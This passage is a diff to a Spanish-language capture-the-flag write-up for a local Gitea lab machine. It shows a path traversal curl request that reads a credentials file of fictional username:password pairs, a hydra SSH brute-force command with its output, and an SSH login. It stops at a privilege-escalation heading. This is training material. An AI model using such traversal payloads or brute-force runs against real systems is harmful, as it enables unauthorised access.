@@ -219,5 +219,170 @@ y otro que nos da unas rutas de gitea:
             <variable name="GITEA__database__PATH">/data/gitea.db</variable>
 ```
 
-En esta parte concretamente nos vamos a centrar, vemos "<volume>/home/designer/gitea:/data/info.txt</volume>" pues vamos a hacer una peticion curl con ep pathtraversal:
+En esta parte concretamente vemos dos rutas "/home/designer/gitea:/data/info.txt" y "/opt/"INFO_FILE""
+probamos con
 ```bash
+http://gitea.dl/download?filename=../../../../../../../../../../home/designer/gitea/data/info.txt
+```
+y no obtenemos nada, pruebo en /opt y me imagino que info file sea info.txt como para el /home:
+```bash
+ curl "http://gitea.dl/download?filename=../../../../../opt/info.txt"
+```
+```
+user001:Passw0rd!23 - Juan abrió su laptop y suspiró. Hoy era el día en que finalmente accedería a la base de datos.
+user002:Qwerty@567 - Marta había elegido su contraseña basándose en su teclado, una decisión que lamentaría más tarde.
+user003:Secure#Pass1 - Cuando Miguel configuró su clave, pensó que era invulnerable. No sabía lo que le esperaba.
+user004:H4ckM3Plz! - Los foros de hackers estaban llenos de desafíos, y Pedro decidió probar con una cuenta de prueba.
+user005:Random*Key9 - Sofía tenía la costumbre de escribir sus contraseñas en post-its, hasta que un día desaparecieron.
+user006:UltraSafe99$ - "Esta vez seré más cuidadoso", se prometió Andrés mientras ingresaba su nueva clave.
+user007:TopSecret!! - Lucía nunca compartía su contraseña, ni siquiera con sus amigos más cercanos.
+user008:MyP@ssw0rd22 - Julián pensó que usar números en lugar de letras lo haría más seguro. Se equivocó.
+user009:S3cur3MePls# - La empresa exigía contraseñas seguras, pero Carlos siempre encontraba una forma de simplificarlas.
+user010:Admin123! - Un ataque de fuerza bruta reveló que la cuenta del administrador tenía una clave predecible.
+user011:RootMePls$5 - Daniel dejó su servidor expuesto y no tardó en notar actividad sospechosa.
+user012:SuperSecure*78 - Alejandra se enorgullecía de su conocimiento en seguridad, pero un descuido le costó caro.
+user013:HelloWorld#91 - A Roberto le gustaba la programación y decidió usar un clásico como su clave.
+user014:LetMeInNow!! - Diego estaba cansado de recordar claves complejas y optó por algo simple.
+user015:TrickyPass66 - Una red social filtró su contraseña y pronto la vio expuesta en la web.
+user016:UnsafeButFun$$ - Joaquín se divertía rompiendo su propia seguridad, pero un día fue víctima de su propio juego.
+user017:HackThis!@3 - Beatriz creó su contraseña en modo irónico, pero los atacantes no lo tomaron como broma.
+user018:SuperSecurePassword123 - Los hackers más novatos pensaban que usar lenguaje leet era seguro. No lo era.
+user019:JustAnotherKey99 - Nadie pensaría en usar una clave tan genérica... excepto miles de personas.
+user020:TryGuessMe#22 - Un pentester descubrió la clave en segundos y le envió un mensaje a su dueño.
+user021:SimplePass88! - Isabel nunca imaginó que alguien intentaría adivinar su contraseña.
+user022:HiddenSecret!2 - Aún después de cambiar su clave, Luis no podía quitarse la sensación de inseguridad.
+user023:CrazyCodePass@ - Un desarrollador decidió probar una contraseña al azar... y olvidarla al día siguiente.
+user024:SneakyKey99$ - Los ataques de diccionario estaban de moda, y Pablo decidió cambiar su clave.
+user025:Password@Vault - Un gestor de contraseñas podría haber ayudado a Ricardo, pero prefirió confiar en su memoria.
+user026:EliteHacker#77 - Creer que una contraseña es segura solo por tener símbolos es un error común.
+user027:FortKnoxPass!! - Ignacio aprendió por las malas que no existe una seguridad infalible.
+user028:IronWall!99 - La clave era sólida, pero un descuido con su correo llevó a una filtración.
+user029:UltraHidden#32 - A pesar del nombre, la contraseña de Javier no era tan oculta.
+user030:GodModeActive! - Mariana sintió que tenía el control, hasta que recibió una alerta de acceso sospechoso.
+user031:MasterKey$66 - Un viejo truco de seguridad le falló a Fernando en el peor momento.
+user032:NoOneCanSeeMe! - La privacidad era esencial para Esteban, pero alguien siempre estaba mirando.
+user033:LockedSafe#12 - Una contraseña compleja no sirve si la guardas en un documento sin cifrar.
+user034:MyLittleSecret@ - El diario de Valeria contenía muchos secretos, incluida su clave más preciada.
+user035:BigBossKey!! - Alfonso era el administrador del sistema, pero un error le costó el acceso.
+user036:DigitalFortress$ - Inspirado en su novela favorita, Tomás creó una clave única... o eso creía.
+user037:PasswordBank#9 - Usar la misma clave para todo fue la peor decisión de Gabriel.
+user038:YouShallNotPass! - El homenaje a Gandalf no protegió a Enrique de un ataque automatizado.
+user039:NotSoObvious99 - Era una contraseña "no tan obvia", hasta que apareció en una filtración.
+user040:SecretStash@12 - Emilia guardaba sus contraseñas en un archivo llamado "Seguridad.txt". Mala idea.
+user041:AnonymousPass$ - Creyó que su clave era anónima, pero los registros contaban otra historia.
+user042:BlackHatKey!77 - Aprender hacking ético le ayudó a darse cuenta de sus propias vulnerabilidades.
+user043:RedTeamAccess# - Un pentest interno reveló que la seguridad de la empresa era más frágil de lo que pensaban.
+user044:PrivilegedUser@ - Tener privilegios de administrador no te hace inmune a ataques.
+user045:HiddenVault$$ - Un sistema de almacenamiento cifrado no sirve si la clave es demasiado simple.
+user046:EncryptionKing! - Amante del cifrado, Samuel pensó que su clave era invulnerable. No lo era.
+user047:DecryptedEasy# - Un día descubrió que su clave había sido descifrada con facilidad.
+user048:BypassMePlz!! - Quiso jugar con la seguridad y terminó perdiendo el acceso.
+user049:SuperHiddenKey@ - Creyó que su contraseña nunca sería descubierta... hasta que lo fue.
+user050:CyberGuardian99! - La ciberseguridad no es solo cuestión de contraseñas fuertes, sino de hábitos seguros.
+```
+
+Bueno ya tenemos un montón de contraseñas y con el cat al /etc/home unos usuarios, es el momento de lanzar fuerza bruta al ssh.
+Nos creamos un diccionario con los password que obtuvimos antes quedando así:
+```bash
+Passw0rd!23
+Qwerty@567
+Secure#Pass1
+H4ckM3Plz!
+Random*Key9
+UltraSafe99$
+TopSecret!!
+MyP@ssw0rd22
+S3cur3MePls#
+Admin123!
+RootMePls$5
+SuperSecure*78
+HelloWorld#91
+LetMeInNow!!
+TrickyPass66
+UnsafeButFun$$
+HackThis!@3
+SuperSecurePassword123
+JustAnotherKey99
+TryGuessMe#22
+SimplePass88!
+HiddenSecret!2
+CrazyCodePass@
+SneakyKey99$
+Password@Vault
+EliteHacker#77
+FortKnoxPass!!
+IronWall!99
+UltraHidden#32
+GodModeActive!
+MasterKey$66
+NoOneCanSeeMe!
+LockedSafe#12
+MyLittleSecret@
+BigBossKey!!
+DigitalFortress$
+PasswordBank#9
+YouShallNotPass!
+NotSoObvious99
+SecretStash@12
+AnonymousPass$
+BlackHatKey!77
+RedTeamAccess#
+PrivilegedUser@
+HiddenVault$$
+EncryptionKing!
+DecryptedEasy#
+BypassMePlz!!
+SuperHiddenKey@
+CyberGuardian99!
+```
+
+## FASE DE INTRUSIÓN
+
+Es el momento de ralizar fuerza bruta con hydra:
+```bash
+hydra -P diccionario.txt  -l designer  -t 16 -V -f -I ssh://172.17.0.2
+```
+```
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-13 14:44:05
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 50 login tries (l:1/p:50), ~4 tries per task
+[DATA] attacking ssh://172.17.0.2:22/
+[ATTEMPT] target 172.17.0.2 - login "designer" - pass "Passw0rd!23" - 1 of 50 [child 0] (0/0)
+[ATTEMPT] target 172.17.0.2 - login "designer" - pass "Qwerty@567" - 2 of 50 [child 1] (0/0)
+[ATTEMPT] target 172.17.0.2 - login "designer" - pass "Secure#Pass1" - 3 of 50 [child 2] (0/0)
+[ATTEMPT] target 172.17.0.2 - login "designer" - pass "H4ckM3Plz!" - 4 of 50 [child 3] (0/0)
+[ATTEMPT] target 172.17.0.2 - login "designer" - pass "Random*Key9" - 5 of 50 [child 4] (0/0)
+[ATTEMPT] target 172.17.0.2 - login "designer" - pass "UltraSafe99$" - 6 of 50 [child 5] (0/0)
+[ATTEMPT] target 172.17.0.2 - login "designer" - pass "TopSecret!!" - 7 of 50 [child 6] (0/0)
+[ATTEMPT] target 172.17.0.2 - login "designer" - pass "MyP@ssw0rd22" - 8 of 50 [child 7] (0/0)
+[ATTEMPT] target 172.17.0.2 - login "designer" - pass "S3cur3MePls#" - 9 of 50 [child 8] (0/0)
+[ATTEMPT] target 172.17.0.2 - login "designer" - pass "Admin123!" - 10 of 50 [child 9] (0/0)
+[ATTEMPT] target 172.17.0.2 - login "designer" - pass "RootMePls$5" - 11 of 50 [child 10] (0/0)
+[ATTEMPT] target 172.17.0.2 - login "designer" - pass "SuperSecure*78" - 12 of 50 [child 11] (0/0)
+[ATTEMPT] target 172.17.0.2 - login "designer" - pass "HelloWorld#91" - 13 of 50 [child 12] (0/0)
+[ATTEMPT] target 172.17.0.2 - login "designer" - pass "LetMeInNow!!" - 14 of 50 [child 13] (0/0)
+[ATTEMPT] target 172.17.0.2 - login "designer" - pass "TrickyPass66" - 15 of 50 [child 14] (0/0)
+[ATTEMPT] target 172.17.0.2 - login "designer" - pass "UnsafeButFun$$" - 16 of 50 [child 15] (0/0)
+[ATTEMPT] target 172.17.0.2 - login "designer" - pass "HackThis!@3" - 17 of 50 [child 14] (0/0)
+[ATTEMPT] target 172.17.0.2 - login "designer" - pass "SuperSecurePassword123" - 18 of 50 [child 12] (0/0)
+[22][ssh] host: 172.17.0.2   login: designer   password: SuperSecurePassword123
+[STATUS] attack finished for 172.17.0.2 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-13 14:44:09
+```
+ya tenemos el user y el pass designer:SuperSecurePassword123
+
+Nos conectamos por SSH:
+```bash
+ssh designer@172.17.0.2
+```
+
+Ya estamos dentro
+
+
+## FASE ESCALADA DE PRIVILEGIOS
+
+Recordamos que teniamos unos user y password para mysql
